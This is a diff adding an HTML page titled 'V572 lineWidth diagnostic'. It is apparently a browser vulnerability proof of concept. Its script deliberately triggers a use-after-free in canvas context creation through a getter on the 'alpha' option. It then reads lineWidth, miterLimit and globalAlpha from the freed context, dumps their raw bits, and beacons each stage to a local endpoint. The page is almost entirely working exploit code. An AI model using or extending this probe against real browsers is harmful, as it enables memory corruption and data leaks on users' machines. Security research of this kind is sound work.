@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V572</title></head>
+<body><pre id="out">V572 — lineWidth diagnostic (beacon-first)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V572-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();}catch(e){}
+  try{fetch('/beacon/V572-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now(),{method:'GET',cache:'no-store'}).catch(function(){});}catch(e){}
+}
+
+var f64buf=new Float64Array(1);
+var u32buf=new Uint32Array(f64buf.buffer);
+function dblBits(d){f64buf[0]=d;return{lo:u32buf[0],hi:u32buf[1]};}
+function hex8(v){return('00000000'+((v>>>0).toString(16))).slice(-8);}
+function hexPair(hi,lo){return'0x'+hex8(hi)+hex8(lo);}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+
+bk('BOOT','saves='+NSAVES);
+say('BOOT beacon sent');
+
+var innerCtx=null;
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d');
+    innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0;
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  return c;
+}
+
+bk('PRE-UAF','about-to-trigger');
+
+var outerC=triggerUAF();
+
+bk('POST-UAF','triggered');
+
+var lwA, mlA, gaA, errA;
+try { lwA=innerCtx.lineWidth; } catch(e){ errA='lw:'+e.message; }
+try { mlA=innerCtx.miterLimit; } catch(e){ errA=(errA||'')+' ml:'+e.message; }
+try { gaA=innerCtx.globalAlpha; } catch(e){ errA=(errA||'')+' ga:'+e.message; }
+
+bk('READ','lw='+(errA||lwA)+',ml='+(errA||mlA)+',ga='+(errA||gaA));
+
+say('lineWidth='+(errA||lwA));
+if(lwA!==undefined){
+  var bits=dblBits(lwA);
+  say('  raw='+hexPair(bits.hi,bits.lo));
+  bk('BITS','lw='+hexPair(bits.hi,bits.lo));
+}
+if(mlA!==undefined){
+  var bits=dblBits(mlA);
+  say('  miterLimit='+mlA+' raw='+hexPair(bits.hi,bits.lo));
+}
+if(gaA!==undefined){
+  var bits=dblBits(gaA);
+  say('  globalAlpha='+gaA+' raw='+hexPair(bits.hi,bits.lo));
+}
+
+bk('DONE','complete');
+say('V572 complete.');
+</script>
+</body>
+</html>
